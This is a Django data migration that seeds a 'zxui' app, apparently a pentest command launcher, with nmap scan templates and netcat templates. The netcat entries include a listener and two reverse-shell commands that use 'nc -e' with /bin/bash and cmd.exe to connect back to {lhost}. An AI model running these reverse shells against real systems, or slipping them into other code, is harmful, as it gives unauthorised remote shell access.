from django.db import migrations


def seed_defaults(apps, schema_editor):
    Tool = apps.get_model('zxui', 'Tool')
    CommandTemplate = apps.get_model('zxui', 'CommandTemplate')

    nmap, _ = Tool.objects.get_or_create(
        name='nmap',
        defaults={'description': 'Network mapper for host discovery and port scanning.'},
    )
    netcat, _ = Tool.objects.get_or_create(
        name='netcat',
        defaults={'description': 'Networking utility for TCP/UDP connections and listeners.'},
    )

    def add_command(tool, name, template, description=''):
        CommandTemplate.objects.get_or_create(
            tool=tool,
            name=name,
            defaults={'template': template, 'description': description},
        )

    add_command(
        nmap,
        'Service detection',
        'nmap -sV -sC {target}',
        'Version detection with default scripts.',
    )
    add_command(
        nmap,
        'Full TCP sweep',
        'nmap -p- -T4 {target}',
        'Scan all TCP ports with faster timing.',
    )
    add_command(
        nmap,
        'Aggressive scan',
        'nmap -A --top-ports 100 {target}',
        'OS detection, version detection, and traceroute.',
    )
    add_command(
        netcat,
        'Listener',
        'nc -lvnp {lport}',
        'Start a local TCP listener.',
    )
    add_command(
        netcat,
        'Reverse shell (bash)',
        'nc {lhost} {lport} -e /bin/bash',
        'Connect back to a listener with a bash shell.',
    )
    add_command(
        netcat,
        'Reverse shell (cmd)',
        'nc {lhost} {lport} -e cmd.exe',
        'Connect back to a listener with a Windows shell.',
    )


def remove_defaults(apps, schema_editor):
    Tool = apps.get_model('zxui', 'Tool')
    Tool.objects.filter(name__in=['nmap', 'netcat']).delete()


class Migration(migrations.Migration):
    dependencies = [
        ('zxui', '0001_initial'),
    ]

    operations = [
        migrations.RunPython(seed_defaults, remove_defaults),
    ]
